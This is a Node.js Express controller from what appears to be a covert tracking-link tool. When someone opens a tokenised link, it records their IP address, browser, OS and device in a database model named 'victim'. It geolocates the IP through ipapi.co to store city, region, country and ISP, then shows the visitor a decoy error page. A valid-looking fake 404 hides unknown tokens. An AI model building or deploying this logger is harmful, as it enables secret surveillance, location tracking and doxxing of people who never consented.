const path=require("path");
const dbConnect=require("../dbconnect");
const victimmodel=require("../models/victimmodels");
const uaparser=require("ua-parser-js");
const axios=require("axios");


async function storeDetails(req,res)
{
	try
	{
		//connect to db
		await dbConnect();
	}
	catch(err)
	{
		res.json({"status":"Failed",msg:err.message});
		return;
	}
	let token=req.params.token;
	let ip=req.headers["x-forwarded-for"] || req.ip;
	console.log(ip)
	let useragent=uaparser(req.headers["user-agent"]);
	let browser=useragent["browser"]["name"];
	let os=useragent["os"]["name"];
	let device=useragent["device"];
	try
	{
		victim=await victimmodel.findOne({token:token});
		//update only if user token is avalible else not 
		if(victim)
		{
			let data=await getLocation(ip);
			if(data)
			{
				let {city,region,country,org}=data;
				data=await victimmodel.findOneAndUpdate({token:token},{ip:ip,isvisited:true,city:city,region:region,country:country,org:org,device:device,os:os,browser:browser,date:new Date()});
			}
			res.render("error");
		}
		else
		{
			res.send("<h1>404 Not Found</h1>");
		}
	}
	catch(err)
	{
		res.json({"status":"Failed",msg:err.message});
		return;
	}

}


//getting location based on ip add
async function getLocation(ip)
{
	
	try
	{
			let res =await axios.get("https://ipapi.co/"+ip+"/json/");
			if(res["data"]["error"]==true)
			{
				console.log(res["data"]["reason"]);
			}
			return res["data"];
	}
	catch(err)
	{
		console.log(err.message);
		return -1;
	}
	
}

module.exports=storeDetails;